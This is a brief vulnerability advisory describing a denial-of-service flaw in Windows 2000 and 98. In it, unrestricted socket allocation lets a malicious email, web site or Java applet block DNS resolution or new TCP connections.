Microsoft Windows 2000 and 98 are subject to a denial of service condition. Receiving a maliciously crafted email or visiting a malicious web site could prevent Windows 2000 from DNS resolution and Windows 98 from accepting any new TCP connections. This is due to a lack of restrictions on the allocation of network "sockets" by user applications.

A malicious java applet placed on a website could exploit this vulnerability and cause a DoS on victim systems.
